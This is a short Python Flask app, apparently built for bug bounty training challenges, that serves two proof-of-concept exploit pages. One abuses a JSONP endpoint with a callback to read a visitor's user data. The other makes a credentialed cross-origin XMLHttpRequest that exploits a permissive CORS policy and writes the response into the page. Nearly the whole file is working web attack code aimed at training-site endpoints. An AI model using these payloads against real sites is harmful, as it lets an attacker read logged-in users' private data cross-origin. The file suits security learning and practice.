from flask import Flask, request, render_template
app = Flask(__name__)


@app.route('/')
def index():
    return 'Hello, World!', 200


@app.route('/jsonp_exploit')
def jsonp():
    html = """
        <script>
              userinfo = function (data) {
              alert(JSON.stringify(data));
              };  
        </script>
        <script src="https://www.bugbountytraining.com/challenges/challenge-15.php?jsonp=userinfo"></script>
    """
    return html, 200


@app.route('/cors_exploit')
def cors():
    html = """
    <script>
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                document.write(xhttp.responseText);
            }
        };
        xhttp.open("GET", "https://www.bugbountytraining.com/challenges/challenge-16.php", true);
        xhttp.withCredentials=true;
        xhttp.send();
    </script>
    hello
    """
    return html, 200



if __name__ == '__main__':
    # for https in local
    # app.run(host='127.0.0.1', port=443, debug=True, ssl_context=("cert/server.crt", "cert/server.key"))

    app.run(host='127.0.0.1', port=8000, debug=True)
